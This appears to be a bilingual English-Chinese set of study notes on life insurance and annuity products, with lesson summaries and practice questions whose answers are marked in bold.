id="课后习题"><a href="#课后习题" class="headerlink" title="课后习题"></a>课后习题</h2><p>1.Carlos Mendoza purchased a \$ 250,000 insurance policy on his life that requires him to pay equal annual premium payments. If Mr. Mendoza keeps the policy in force by paying then annual renewal premiums, and if he dies anytime within 20 years after purchasing the policy, then the policy will provide a $250,000 death benefit. The policy provides no coverage beyond the 20-year period, and Mr. Mendoza will not receive anything if he lives to the end of the policy term. This information indicates that the type of insurance policy Mr. Mendoza owns is</p><ul><li>an increasing term life insurance policy</li><li><strong>a level term life insurance policy</strong></li><li>a decreasing term life insurance policy</li><li>an attained age conversion term life insurance policy<blockquote><p>卡洛斯·门多萨购买了一份价值25万美元的人寿保险，要求他每年支付同等的保费。如果门多萨先生通过支付每年的续保费来维持保单的有效性，并且如果他在购买保单后20年内的任何时候死亡，那么保单将提供25万美元的死亡福利。该政策在20年期间不提供保险，如果门多萨活到政策任期结束，他将不会得到任何东西。这些信息表明，门多萨先生的保单类型是</p><ul><li>增加定期的人寿保险单</li><li>水平定期人寿保险单</li><li>递减定期人寿保险单</li><li>成年转换定期人寿保险单</li></ul></blockquote></li></ul><p>2.Dolly Varden purchased a new home and obtained a 30-year mortgage loan from the Sanguine Bank To insure her mortgage loan, Dolly purchased from the Valiant Insurance Company mortgage insurance policy that named her husband William as the beneficiary. The following statements are about this situation. Select the answer choice containing the correct statement.</p><ul><li>In the event of Dollys death, William is required to use the policy proceeds of the mortgage insurance policy to repay the mortgage loan.</li><li><strong>The amount of the policy benefit payable at any given time under Dollys mortgage insurance policy generally equals the amount owed on the mortgage.</strong></li><li>The Sanguine Bank is a party to the mortgage insurance contract that Dolly purchased.</li><li>Valiant is a party to the mortgage loan contract that Dolly obtained.<blockquote><p>Dolly Varden购买了一套新房子，并从Sanguine银行获得了30年的抵押贷款。为了给她的抵押贷款投保，Dolly从Valiant保险公司购买了一份抵押保险单，将她的丈夫William列为受益人。以下声明是关于本公告的。选择包含正确陈述的答案。</p><ul><li>如果多利斯去世，威廉必须使用抵押保险单的保单收益来偿还抵押贷款。</li><li>根据Dollys抵押贷款保险单，在任何特定时间应付的保单福利金额通常等于抵押贷款所欠金额。</li><li>Sanguine银行是Dolly购买的抵押保险合同的一方。</li><li>Valiant是Dolly获得的抵押贷款合同的一方。</li></ul></blockquote></li></ul><p>3.The following statements are about credit life insurance and family income coverage. Select the answer choice containing the correct statement</p><ul><li>The proceeds of a credit life insurance policy may be paid to a beneficiary other than the lender, or creditor, if the insured borrower dies during the policy’s term</li><li>The amount of the benefit payable under a credit life insurance policy usually remains level over the duration of the loan</li><li><strong>Family income coverage provides a stated monthly income benefit amount to the beneficiary if the insured dies during the term of coverage</strong></li><li>Family income coverage is a plan of increasing term life insurance<blockquote><p>以下报表是关于信用人寿保险和家庭收入保险的。选择包含正确答案的选项</p><ul><li>如果被保险借款人在保单有效期内死亡，则信用个险保险单的收益可支付给贷款人或债权人以外的受益人</li><li>信用人寿保险单下的应付福利金额通常在贷款期间保持不变</li><li>如果被保险人在保险期内死亡，家庭收入保险将向受益人提供规定的每月收入福利金额</li><li>家庭收入保险是一项增加定期人寿保险的计划</li></ul></blockquote></li></ul><p>4.Caitlin Miler, age 35, purchased a \$ 150,000 20-year return of premium (ROP) term insurance policy from the Karat Insurance Company. Ms. Miller paid annual premiums of \$ 300. Ms. Miller paid all required premiums and was alive at the end of the 20-year term when the policy expired. This information indicates that</p><ul><li>Ms. Miller’s policy expired without Karat making any payment to anyone</li><li><strong>Karat paid $6,000 to Ms. Miller</strong></li><li>Karat paid $150,000 to Ms. Miller<blockquote><p>35岁的Caitlin Miler从Karat保险公司购买了一份价值150000美元的20年期保费回报定期保险。米勒每年支付300美元的保险费。Miller女士支付了所有所需的保费，在保单到期的20年任期结束时还活着。该信息表明</p><ul><li>Miller女士的保单到期了，Karat没有向任何人付款</li><li>Karat向Miller女士支付了6000美元</li><li>Karat向Miller女士支付了150000美元</li></ul></blockquote></li></ul><p>5.Geneva Watson purchased a $ 100,000 15-year renewable term insurance policy on her life. At the end of the 15-year term, the renewal provision in Ms. Watsons policy most likely gives her the right, within specified limits, to renew her insurance coverage</p><ul><li>for a one-year term, but not for another 15-year term</li><li>after first undergoing a required medical examination </li><li>at the same premium rate she was charged for the origin 15-year policy</li><li><strong>without having to submit evidence for her insurability</strong><blockquote><p>Geneva Watson购买了一份价值10万美元的15年可续期定期人寿保险。在15年任期结束时，Geneva Watson女士保单中的续保条款很可能赋予她在特定限额内续保的权利</p><ul><li>任期一年，但不能再延长15年</li><li>在第一次接受必要的医学检查后</li><li>按照同样的保险费率，她被收取了15年的原始保单费用</li><li>而无需提交其可保性的证据</li></ul></blockquote></li></ul><p>6.Convertible term life insurance policies contain features that allow the policyowner to convert the coverage to a cash value life insurance policy. In order to convert such a term life insurance policy, evidence of insurability (is&#x2F;<strong>is not</strong>) required. Due to potential antiselection, insurers will typically charge (lower&#x2F;<strong>higher</strong>) premiums for convertible policies than comparable term policies that are not convertible.</p><blockquote><p>可转换定期人寿保险包含允许投保人将保险范围转换为现金价值人寿保险的功能。为了转换这种定期人寿保险政策，不需要可保性的证据。由于潜在的反选择，保险公司通常会对可转换保单收取比不可转换的可比定期保单更高的保费</p></blockquote><h1 id="Lesson-2"><a href="#Lesson-2" class="headerlink" title="Lesson 2"></a>Lesson 2</h1><h2 id="Cash-Value-Life-Insurance【现金价值寿险】"><a href="#Cash-Value-Life-Insurance【现金价值寿险】" class="headerlink" title="Cash Value Life Insurance【现金价值寿险】"></a>Cash Value Life Insurance【现金价值寿险】</h2><p>Cash value life insurance offers lifetime coverage and a savings element(called the cash value).<br>现金价值寿险提供终身覆盖和储蓄要素，称为现金价值。</p><p>In addition to a death benefit, cash value life insurance has a savings element—known as a cash value—that the policyowner can access while the insured is still alive.<br>Just how big a policy’s cash value is at any given time depends on the</p><ol><li>Policy face amount 保单票面金额</li><li>Length of time the policy has been in force 政策生效的时间长度</li><li>Length of the policy’s premium payment period 保单的保费支付期限</li></ol><blockquote><p>The owner of a cash value insurance policy can borrow against the cash value by taking out a policy loan directly from the insurance company.<br>现金价值保险单的所有者可以直接从保险公司获得保单贷款，以现金价值为抵押借款。</p><p>Policy loans reduce policy values because a policy loan is actually an advance payment of part of the amount that the insurer eventually must payout &gt;under the policy.<br>保单贷款会降低保单价值，因为保单贷款实际上是保险公司根据保单最终必须支付的部分金额的预付款。</p><p>With a policy surrender, you get the cash from the policy’s entire cash surrender value, which is the cash value amount less any amounts the<br>policyowner owes, such as outstanding policy loans and charges.<br>通过保单退保，您可以从保单的全部现金退保价值中获得现金，即现金价值减去保单持有人所欠的任何金额，如未偿还的保单贷款和费用。</p><p>After the surrender, the coverage terminates and no further benefits are payable.<br>退保后，保险终止，不再支付其他福利。</p></blockquote><p>Traditional whole life insurance is the most basic type of cash value life insurance, provides a constant amount of lifetime coverage, has a level premium rate that doesn’t increase with insured’s age.<br>传统的终身保险是最基本的现金价值人寿保险，提供恒定的终身保险金额，保费水平不会随着被保险人的年龄而增加。</p><p>Types of cash value coverage:</p><ul><li>Whole life insurance—the most basic type of cash value policy 整个人寿保险- 最基本的现金价值保单类型</li><li>Provides constant amount of coverage with level premiums 提供稳定的保额和级别保费</li><li>Single-premium, limited payment, and continuous premium options 单期付清、有限期付款和连续保费选择</li></ul><p>Modified whole life policies allow more flexibility</p><ul><li>Modified-premium—Smaller premiums for an initial period, then larger premiums for remainder of policy. Level face amount.<ul><li>修改保费 - 初始时期的保费较低，剩余期间的保费较高。保额保持不变。</li></ul></li><li>Modified coverage—Larger face amount at first, then smaller face amount during policy’s later years. Level premium amount.<ul><li>修改保额 - 初始时期的保额较高，后期逐渐降低。保费金额保持不变。</li></ul></li><li>Joint whole life—Insures two lives under one policy. Pays death benefit when the FIRST insured dies.<ul><li>联合整个人寿保险 - 一项保单为两个人提供保险。在第一位被保险人去世时支付身故保险金。</li></ul></li><li>Last survivor coverage—Insures two or more lives under one policy. Pays death benefit when the LAST insured dies.<ul><li>最后生还者保险 - 一项保单为两个或更多人提供保险。当最后一个被保险人去世时支付身故保险金。</li></ul></li></ul><h2 id="Other-Types-of-Life-Insurance-Policies【其他类型的人寿保险单】"><a href="#Other-Types-of-Life-Insurance-Policies【其他类型的人寿保险单】" class="headerlink" title="Other Types of Life Insurance Policies【其他类型的人寿保险单】"></a>Other Types of Life Insurance Policies【其他类型的人寿保险单】</h2><p>New generation cash value products:</p><ul><li>Universal Life (UL) 万能寿险<ul><li>Separate pricing factors—clearly lists mortality charges, interest rate, and fees 分离定价因素- 清晰列出死亡风险费用、利率和费用。</li><li>Within limits, policyowner can adjust face amount and size&#x2F;timing of premiums 在限制范围内，投保人可以调整保额和保费的大小&#x2F;时机。</li><li>Policyowner can choose level death benefit or variable death benefit 投保人可以选择级别死亡保险金或浮动死亡保险金。</li></ul></li><li>Indexed Universal Life (IUL) 指数万能寿险<ul><li>Offers same features as universal life 提供与万能寿险相同的功能。</li><li>Allows policyowner to tie cash value to an equity index (example: S&amp;P 500) 允许投保人将现金价值与股票指数（例如：S&amp;P 500）挂钩。</li><li>Guarantees a minimum interest rate 保证最低利率</li></ul></li><li>Variable Life (VL) 变额万能寿险<ul><li>Premiums are fixed 保费固定。</li><li>Policyowner chooses how premiums are invested—into a fixed account or one or more subaccounts 投保人可以选择将保费投资于固定账户或一个或多个子账户。</li><li>Cash value and death benefit vary according to subaccount performance 根据子账户表现，现金价值和身故保险金会有所变化。</li><li>Regulated as securities 受证券法规管制。</li></ul></li><li>Variable Universal Life (VUL) 变额万能寿险<ul><li>Blends investment flexibility of VL with premium and death benefit flexibility of UL 将变额寿险的投资灵活性与万能寿险的保费和身故保险金灵活性相结合。</li><li>Like VL, policyowner chooses how premiums are invested 类似于变额寿险，投保人可以选择如何投资保费。</li><li>Like UL, policyowner can choose the size&#x2F;timing of renewal premiums 类似于万能寿险，投保人可以选择保费的大小&#x2F;时机。</li><li>Like UL, policyowner can choose whether death benefit varies or remains level 类似于万能寿险，投保人可以选择身故保险金的变动或保持稳定。</li><li>Regulated as securities 受证券法规管制。</li></ul></li></ul><blockquote><p>Flexible premiums: UL&#x2F;IUL&#x2F;VUL Fixed Premiums: VL</p><p>Separate pricing factors: UL&#x2F;IUL&#x2F;VUL</p><p>Policyowner assumes investment risk: VL&#x2F;VUL</p><p>Death benefit can remain level or vary with changes to cash value: UL&#x2F;IUL&#x2F;VUL</p><p>Death benefit varies according to investment performance: VL&#x2F;VUL</p></blockquote><h2 id="课后习题-1"><a href="#课后习题-1" class="headerlink" title="课后习题"></a>课后习题</h2><p>1.In comparing cash value life insurance coverage and term life insurance coverage, the following statement(s) can correctly be made:<br>A. Both cash value life insurance and term life insurance provide a savings element.<br>B. Cash value life insurance provides coverage for the insured’s lifetime, whereas term life insurance provides coverage for a specified term only.</p><ul><li>Both A and B</li><li>A only</li><li><strong>B only</strong> </li><li>Neither A nor B<blockquote><p>在比较现金价值人寿保险和定期人寿保险时，可以正确地做出以下声明：<br>A.现金价值人寿保险和定期人寿保险都提供了储蓄要素。<br>B.现金价值人寿保险为被保险人的一生提供保险，而定期人寿保险仅为特定期限提供保险。</p><ul><li>A和B</li><li>仅A</li><li>仅限B</li><li>既不是A也不是B</li></ul></blockquote></li></ul><p>2.The policyowner of a cash value life insurance policy can borrow against the policy by taking out a policy loan. Such a policy loan (<strong>does</strong>&#x2F;does not) reduce policy values. Another option that the policyowner has is to elect to receive the policy’s entire cash surrender value. In such a circumstance, the policy coverage (continues&#x2F;<strong>terminates</strong>)</p><blockquote><p>现金价值人寿保险单的投保人可以通过保单贷款的方式向保单借款。这种保单贷款（确实&#x2F;没有）降低保单价值。投保人的另一个选择是选择接收保单的全部现金退保价值。在这种情况<br>下，保单覆盖范围（继续&#x2F;终止)</p></blockquote><p>3.Traditional whole life insurance comes in three types based on the number of premium payments: single-premium policies, limited-payment policies, and continuous-premium policies. The following statement(s) can correctly be made about these types of traditional whole life insurance<br>A. Under a limited-payment whole life insurance policy, the life insurance coverage expires at the end of the specified premium payment period.<br>B. A continuous-premium whole life insurance policy is considered to be paid up when the insured reaches age 65.</p><ul><li>Both A and B</li><li>A only</li><li>B only</li><li><strong>Neither A nor B</strong><blockquote><p>传统的终身保险根据保费支付数量分为三种类型：单一保费保单、有限支付保单和连续保费保单。以下是关于这些类型的传统终身保险的正确说明：<br>A.根据有限支付的终身寿险保单，人寿保险在指定的保费支付期结束时到期。<br>B.连续保费终身寿险保单在被保险人年满65岁时被视为已支付</p><ul><li>A和B</li><li>仅A</li><li>仅限B</li><li>既不是A也不是B</li></ul></blockquote></li></ul><p>4.Eena Myskina, age 35, pays level premiums for a type of whole life insurance. The policy specifies that the face amount will decrease from \$200,000 to \$150,000 when Ms. Myskina reaches age 60, and then decrease again from \$150,000 to \$100,000 when she reaches age 70. In this situtation that Ms. Myskina purchased a (<strong>modified coverage</strong>&#x2F; modified premium) whole life insurance policy. The annual premium that she pays for this policy will be (<strong>lower</strong>&#x2F; higher) than the annual premium she would pay for traditional whole life policy that provided \$200,000 of coverage throughout her lifetime.</p><blockquote><p>35岁的Eena Myskina为一种类型的终身保险支付水平保费。该政策规定，当Myskina女士年满60岁时，票面金额将从20万美元降至15万美元，然后当她年满70岁时，再次从15万美元降<br>至10万美元。在这种情况下，Myskina女士购买了一份（修改的保险范围&#x2F;修改的保费）终身保险。她为该保单支付的年度保费将（低于&#x2F;高于）她为传统终身保单支付的年保费，传统终<br>身保单在她一生中提供了20万美元的保险。</p></blockquote><p>5.Gabrie Haredale purchased a whole life insurance policy that insures both him and his wife, Martha. The policy specifies that the death benefit will be paid only after both Gabriel and Martha have died. This information indicates that the type of insurance policy Gabriel purchased is</p><ul><li>family income coverage</li><li>a joint whole life insurance policy</li><li><strong>a last survivor life insurance policy</strong></li><li>a first-to-die life insurance policy<blockquote><p>GabrieHaredale购买了一份终身保险，为他和他的妻子Martha提供保险。该政策规定，只有在Gabriel和Martha都去世后，才能支付死亡抚恤金。该信息表明Gabriel购买的保险单类<br>型为</p><ul><li>家庭收入保险</li><li>联合终身保险</li><li>最后一份遗属人寿保险</li><li>第一份死亡人寿保险</li></ul></blockquote></li></ul><p>6.One true statement about a universal life (UL) insurance policy is that the</p><ul><li>pricing factors such as mortality charges, interest and expenses, are incorporated into the premium that the policyowner pays and are not stated separately</li><li>policy is treated as a life insurance product under United States federal tax laws, regardless of the size of the policy’s cash value in relation to its face amount</li><li><strong>policyowner decides, within certain limits, what the policy’s face amount will be, the amount of the death benefit payable, and the amount of premiums he will pay for that coverage</strong></li><li>policy is set up to lapse immediately for nonpayment of any premium<blockquote><p>关于通用人寿保险（UL）保单的一个真实陈述是</p><ul><li>定价因素，如死亡率、利息和费用，都包含在投保人支付的保费中，没有单独说明</li><li>根据美国联邦税法，保单被视为人寿保险产品，无论保单的现金价值与票面金额的比例如何</li><li>在一定范围内，投保人决定保单的票面金额、应付死亡保险金金额以及他将为该保险支付的保费金额</li><li>保单被设定为未支付任何保险费立即失效</li></ul></blockquote></li></ul><p>7.The following statements are about variable universal life (VUL) insurance in the United States. Select the answer choice containing the correct statement.</p><ul><li>Most customers choose VUL insurance policies for the guaranteed investment earnings provided by those policies</li><li>The insurance company alone assumes the investment risk of a VUL insurance policy</li><li><strong>VUL insurance policyowners are allowed to invest part of their premiums in a fixed fund</strong></li><li>The death benefit provided by a VUL insurance policy remains constant throughout the life of the policy<blockquote><p>以下是关于美国可变万能人寿保险的声明。选择包含正确陈述的答案。</p><ul><li>大多数客户选择VUL保险，以获得这些保单提供的保证投资收益</li><li>保险公司单独承担VUL保单的投资风险</li><li>VUL保险投保人可以将部分保费投资于固定基金</li><li>VUL保险单提供的死亡保险金在保单有效期内保持不变</li></ul></blockquote></li></ul><h1 id="Lesson-3"><a href="#Lesson-3" class="headerlink" title="Lesson 3"></a>Lesson 3</h1><h2 id="Introduction-to-Annuities【年金简介】"><a href="#Introduction-to-Annuities【年金简介】" class="headerlink" title="Introduction to Annuities【年金简介】"></a>Introduction to Annuities【年金简介】</h2><ul><li>annuitant 年金受益人<ul><li>The annuitant is the person whose lifetime the insurance company uses to determine the amount and duration of annuity payments payable under an annuity contract. Typically, annuity contracts state that the insurer will make annuity payments to the annuitant.</li><li>年金受益人是保险公司根据年金合同使用其寿命来确定年金支付金额和持续时间的人。通常，年金合同规定保险公司向年金受益人支付年金。</li></ul></li><li>payee 支付人<ul><li>The payee is a natural person or legal entity designated by a contract owner to receive annuity payments if the annuitant does not receive them.</li><li>支付人是合同所有人指定的自然人或法人实体，如果年金受益人没有收到年金支付，则支付人可以接收年金支付。</li></ul></li><li>beneficiary 受益人<ul><li>The beneficiary is the person or legal entity who may receive the remaining value of the annuity contract upon the death of the contract owner or annuitant.</li><li>受益人是合同所有人或年金受益人死亡时可能接收年金合同剩余价值的人或法人实体。</li></ul></li><li>joint annuitant 联合年金受益人<ul><li>A joint annuitant is a person, in addition to the primary annuitant, whose lifetime the insurance company uses to determine the amount and duration of annuity payments payable under an annuity contract.</li><li>联合年金受益人是除主要年金受益人以外，保险公司用于确定根据年金合同支付的年金金额和持续时间的人。</li></ul></li></ul><blockquote><p>Note that annuitants and joint annuitants must be people—but payees and beneficiaries can be either people or legal entities, such as trusts or corporations.<br>请注意，年金受益人和联合年金受益人必须是人，而支付人和受益人可以是人或法人实体，例如信托或公司。</p></blockquote><h2 id="Immediate-Annuities-and-Payout-Options【即时年金和支付选项】"><a href="#Immediate-Annuities-and-Payout-Options【即时年金和支付选项】" class="headerlink" title="Immediate Annuities and Payout Options【即时年金和支付选项】"></a>Immediate Annuities and Payout Options【即时年金和支付选项】</h2><p>single-premium immediate annuities (SPIAs)单次保费即时年金</p><ol><li>only one lump-sum premium payment一次性支付保费</li><li>begins making annuity payments within one year after purchase 在购买后的一年内立即开始领取年金</li></ol><ul><li>Life Annuity 人寿年金<ul><li>A payout option that guarantees the insurer will provide annuity payments for only as long as the annuitant lives.</li><li>一种支付选项，保证保险公司只在年金受益人的生命周期内提供年金支付。</li></ul></li><li>Life Income with Period Certain 固定期限的终身收入<ul><li>A payout option that guarantees the insurer will provide annuity payments throughout the annuitant’s lifetime and guarantees that the payments will be made for <strong>at least a specified period</strong>, even if the annuitant dies before the end of that period.</li><li>一种支付选项，保证保险公司将在年金受益人的一生中提供年金支付，并保证支付至少在指定的期限内进行，即使年金受益人在该期限结束前死亡。</li></ul></li><li>Life Income with Refund Annuity 带退款年金的终身收入<ul><li>A payout option that guarantees the insurer will provide annuity payments throughout the annuitant’s lifetime and guarantees the insurer will pay benefits at least equal to the annuity’s purchase price if the annuitant dies. Also called a refund annuity.</li><li>一种支付选项，保证保险公司将在年金受益人的一生中提供年金支付，并保证如果年金受益人死亡，保险公司将支付至少等于年金购买价格的福利。也称为退款年金。</li></ul></li><li>Joint and Survivor Annuity 连生遗族年金<ul><li>A payout option that provides a series of annuity payments based on the life expectancies of two annuitants, and those payments continue until the last annuitant dies.</li><li>一种支付选项，根据两名年金受益人的预期寿命提供一系列年金支付，这些支付一直持续到最后一名年金受益人去世。</li></ul></li></ul><h2 id="Deferred-Annuities【递延年金】"><a href="#Deferred-Annuities【递延年金】" class="headerlink" title="Deferred Annuities【递延年金】"></a>Deferred Annuities【递延年金】</h2><p>single-premium deferred annuity (SPDA)单次保费递延年金<br>flexible-premium deferred annuity (FPDA)灵活保费递延年金</p><p>Accumulated Value &#x3D; Premiums + Earnings – (Withdrawals + Charges)  累计价值&#x3D; 保费+ 收益-（提款+保险公司收费&#x2F;联邦税收）</p><blockquote><p>Deferred annuities typically allow the contract owner to take  <strong>withdrawals</strong>  from the accumulated value during the accumulation period. Withdrawals reduce the annuity’s accumulated value and may result in a <strong>surrender charge</strong> from the insurer.<br>递延年金通常允许合同所有者在累积期内从累积价值中提取。提取会减少年金的累计价值，并可能导致保险公司收取退保费。<br>Surrender charges typically apply during the early years of the contract and decrease each year until the end of the surrender charge period.<br>解约费用通常在合同的最初几年适用，每年都会减少，直到解约费用期结束。<br>Annuitization is the optional process of converting the accumulated value of a deferred annuity into annuity payments; if the contract owner chooses to annuitize, the contract enters the payout period.<br>年金化是将递延年金的累计价值转换为年金支付的可选过程；如果合同所有者选择年金化，则合同进入支付期。  </p></blockquote><h2 id="Fixed-Annuity-Products【固定年金产品】"><a href="#Fixed-Annuity-Products【固定年金产品】" class="headerlink" title="Fixed Annuity Products【固定年金产品】"></a>Fixed Annuity Products【固定年金产品】</h2><p>Fixed-Rate Deferred Annuities (FRDA) 固定利率递延年金</p><ol><li>protect and grow their principal and avoid market risks. 保护和增加本金并避免市场风险</li><li>Guaranteed minimum interest-crediting rate 保证的最低利息核算利率</li><li>current interest-crediting rates 当前的利息核算利率</li><li>The current interest-crediting rate can be higher or lower than the previous rate, but it can’t drop below the guaranteed minimum interest-crediting rate stated in the contract. 本次计息利率可以高于或低于原计息利率，但不得低于合同约定的保证最低利息核算利率</li></ol><p>Fixed indexed annuities (FIAs) 固定指数年金</p><ol><li>offer principal guarantees and a guaranteed minimum interest-crediting rate 提供本金保证和保证的最低利息核算利率</li><li>offer the possibility of additional earnings based on changes in an index  提供了基于指数变动的额外收益可能性</li></ol><p>Deferred Income Annuities(DIAs)递延收入年金</p><ol><li>retirement 适合退休人员</li><li>Can change the date that annuity payments begin 可以改变年金给付的起始日期</li><li>Can choose death benefits 可以申请死亡抚恤金，但金额比较少</li><li>Like immediate annuities, DIAs and QLACs have no accumulation period 与即期年金类似，DIA和QLAC没有累积期</li><li>Like FRDAs, the date when payments will begin is at some point in the future. Unlike FRDAs, DIAs and QLACs specify this date. 与FRDA一样，开始付款的日期是在未来的某个时候。与FRDA不同，DIA和QLAC指定此日期。<blockquote><p>示例:<br>布赖恩·阿道尔菲今年60岁，刚刚买了一辆DIA。按计划，年金将在他67岁退休的7年后开始发放，并将持续他的余生。布莱恩的DIA没有死亡抚恤金。<br>分析:<br>如果布莱恩在65岁时去世，他将永远不会收到任何年金。如果他在68岁时去世，他将只得到一年的抚恤金，之后其他任何人都不会收到任何钱。另一方面，如<br>果布莱恩活到90岁，他将收到23年的付款，而且这些付款将比传统的FRDA更多。</p></blockquote></li></ol><p>Qualified Longevity Annuity Contracts(QLACs) 符合条件的长寿年金合约</p><ol><li>an advanced age 高龄，如80</li><li>can choose a death benefit 可以申请死亡抚恤金，但金额比较少</li><li>can only be purchased with qualified retirement plan funds 只能使用合格的退休计划基金购买</li></ol><p>分类：<br>Fixed annuities</p><ul><li>Fixed immediate Annuities (SPIAs)</li><li>Fixed deferred Annuities<ul><li>Fixed-Rate Deferred Annuities (FRDA)</li><li>Fixed indexed Annuities (FIAs)</li></ul></li><li>Deferred Income Annuities (DIAs)<ul><li>Qualified Longevity Annuity Contracts (QLACs)</li></ul></li></ul><h2 id="Variable-Annuities【可变年金】"><a href="#Variable-Annuities【可变年金】" class="headerlink" title="Variable Annuities【可变年金】"></a>Variable Annuities【可变年金】</h2><p>分类：<br>Variable Annuities</p><ul><li>Variable immediate Annuities</li><li>Variable deferred Annuities<ul><li>Variable deferred Annuities (non-RILAS)</li><li>Registered index-linked annuities (RILAS)</li></ul></li></ul><p>With a variable annuity, the following amounts may vary according to market performance:<br>对于可变年金，以下金额可能因市场表现而异：</p><ul><li>The accumulated value  累计价值</li><li>The annuity payments for contract owners choosing to receive variable annuity payments 选择接收可变年金支付的合同所有者的年金支付金额</li><li>Any withdrawal amounts or annuity payments made under the terms of a living benefit rider 根据寿险效益附加条款的条款进行的任何取款金额或年金支付金额</li></ul><p>Fixed accounts 固定账户</p><ul><li>Are backed by the insurer’s general account 以保险公司的一般账户为后盾</li><li>Accumulate interest at the specified current interest rate, but no lower than the guaranteed minimum interest rate 以指定的当前利率累积利息，但不低于保证的最低利率</li><li>The insurer bears the investment risk. 保险公司承担投资风险</li></ul><p>Subaccounts 子账户</p><ul><li>These subaccounts are part of the insurer’s separate account. 这些子账户是保险公司单独账户的一部分。</li><li>each having a distinct risk&#x2F;return profile and investment strategy 都有不同的风险&#x2F;回报状况和投资策略</li><li>the annuity contract owner bears the investment risk. 年金合同所有者承担投资风险</li></ul><p>Investment Choices 投资选择</p><ul><li>Change the percentage of money allocated to fixed accounts and subaccounts 更改分配给固定账户和子账户的资金百分比</li><li>Transfer funds between fixed accounts and subaccounts, and will not trigger a tax liability 在固定账户和子账户之间转移资金，且不会引发纳税义务</li></ul><blockquote><p>Current Value of an Accumulation Unit x # of Accumulation Units in the Subaccount &#x3D; Contract Owner’s Subaccount Value 累积单位的当前值x子帐户中累积单位的数量&#x3D;合同所有者的子帐户值<br>Total of All Subaccount Values + Fixed Account Values &#x3D; Contract’s Total Accumulated Value 所有子账户价值的总和+固定账户价值&#x3D;合同的总累积价值  </p></blockquote><hr><p>variable annuity contract owners can purchase certain guarantees.</p><ul><li>guaranteed minimum death benefit ( <strong>GMDB</strong> ) 保证最低死亡保险金<ul><li>guarantees that if the annuitant dies before annuity payments begin, the beneficiary will receive at least a stated minimum amount</li><li>保证如果年金受益人在年金支付开始前死亡，受益人将至少获得规定的最低金额</li></ul></li><li>guaranteed minimum income benefit ( <strong>GMIB</strong> ) 保证最低收入福利<ul><li>guarantees a minimum annuity payment amount for life based on the annuitization of a protected value—known as the “benefit base”</li><li>保证根据受保护价值的年金化（称为“福利基础”）提供最低年金支付金额</li></ul></li><li>guaranteed lifetime withdrawal benefit ( <strong>GLWB</strong> ) 保证终身提款福利<ul><li>guarantees annual withdrawals of a specified percentage of a protected value—known as the “benefit base”—for life without annuitizing the contract.</li><li>保证在不使合同年金化的情况下，每年提取受保护价值的特定百分比，即“福利基数”</li></ul></li><li>guaranteed minimum withdrawal benefit ( <strong>GMWB</strong> ) 保证最低提款福利<ul><li>guarantees that, during the accumulation period, a contract owner may withdraw annually a specified percentage of a protected value—known as the “benefit base”</li><li>保证在累积期内，合同所有人可以每年提取受保护价值的特定百分比，即“福利基数”</li></ul></li><li>guaranteed minimum accumulation benefit ( <strong>GMAB</strong> ) 保证最低累积福利<ul><li>guarantees the contract owner will always have a minimum protected amount if the annuity stays in force for a specified period of time</li><li>保证如果年金在指定的时间段内有效，合同所有者将始终拥有最低保护金额</li></ul></li></ul><h2 id="registered-index-linked-annuity【RILA-注册指数挂钩年金】"><a href="#registered-index-linked-annuity【RILA-注册指数挂钩年金】" class="headerlink" title="registered index-linked annuity【RILA 注册指数挂钩年金】"></a>registered index-linked annuity【RILA 注册指数挂钩年金】</h2><ol><li>RILA must be registered as a security RILA必须注册为证券</li><li>RILAs are variable annuities and don’t have subaccounts. RILA是可变年金且没有子账户。</li><li>The contract owner can lose money based on decreases in the value of the stock market index. 合同所有者可能会因股市指数的下跌而亏损。</li><li>RILAs offer contract owners some protection against excessive investment loss by using buffers or floors. RILA通过使用缓冲或下限，为合同所有者提供了一些保护，防止过度投资损失。<ol><li>With a buffer, the accumulated value is protected until index losses exceed a specified limit, such as 10%, 15%, or 20%. For example, with a 10% buffer, if the value of the index decreases by 15%, you would lose 5%. 通过设置缓冲区，累积价值将在指数损失超过特定限制（例如10%，15%或20%）之前得到保护。例如，如果设有10%的缓冲区，当指数的价值下降15%时，您将只会损失5%。</li><li>With a floor, the accumulated value is protected from index losses in excess of a specified percentage, such as 10%. For example, with a 10% floor, if the value of the index decreases by 15%, you would lose 10%. 设置了保底（floor）后，累积价值将在指数损失超过指定百分比（例如10%）时得到保护。例如，如果设有10%的保底，当指数的价值下降15%时，您将只会损失10%。</li></ol></li></ol><h2 id="课后习题-2"><a href="#课后习题-2" class="headerlink" title="课后习题"></a>课后习题</h2><p>1.Linda Clifton purchased an annuity from Meadow Bank, and Pagoda Life Insurance Company issued the annuity. The type of annuity that Ms. Clifton purchased is ( <strong>an individual</strong>  &#x2F; a group) annuity. The parties to this annuity contract are Ms. Clifton and (Meadow &#x2F;  <strong>Pagoda Life</strong> ).</p><blockquote><p>Linda Clifton从Meadow银行购买了年金，Pagoda人寿保险公司发行了年金。克利夫顿女士购买的年金类型为（个人&#x2F;团体）年金。这份年金合同的当事人是克利夫顿女士和（Meadow&#x2F;Pagoda人寿）。</p></blockquote><p>2.The person whose lifetime an insurance company uses to determine the amount and duration of annuity payments payable under an annuity contract is known, by definition, as the</p><ul><li>contract owner</li><li>beneficiary</li><li><strong>annuitant</strong> </li><li>payee<blockquote><p>根据定义，保险公司用来确定年金合同下应付年金金额和期限的人被称为</p><ul><li>合同所有人</li><li>受益人</li><li>年金受益人</li><li>收款人</li></ul></blockquote></li></ul><p>3.An annuity can be immediate or deferred. The following statements are about deferred annuities and immediate annuities. Select the answer choice containing the correct statement.</p><ul><li><strong>An immediate annuity has a payout period but not an accumulation period.</strong> </li><li>The insurer, not the contract owner, selects the annuity period for an immediate annuity.</li><li>A deferred annuity must be purchased with a single premium payment.</li><li>A deferred annuity makes annuity payments that begin no later than one year after purchase.<blockquote><p>年金可以是即时的，也可以是递延的。以下声明是关于递延年金和即时年金的。选择包含正确陈述的答案。</p><ul><li>即时年金有支付期，但没有累积期。</li><li>保险公司而非合同所有人选择即时年金的年金期限。</li><li>延期年金必须一次性支付保费。</li><li>延期年金是指在购买后一年内开始支付的年金。</li></ul></blockquote></li></ul><p>4.Insurers offer different payout options, which let contract owners choose how they will receive annuity payments. Select the answer choice that describes an annuity contract owner who has selected a payout option known as a fixed period annuity.</p><ul><li>lan and Florence Toscano are receiving annuity payments that will continue until both of them have died.</li><li>When Marisela Linares purchased her immediate annuity, she told the insurer she would pay a $250,000 single premium and wanted to receive a $1,000 annuity payment each month. The insurer then calculated how long the premium plus interest could provide $1,000 monthly annuity payments.</li><li><strong>Kurt Besher’s annuity creates a temporary income stream for him for 10 years, and the insurer will pay the remaining annuity payments to a beneficiary if Mr. Besher dies before the end of the 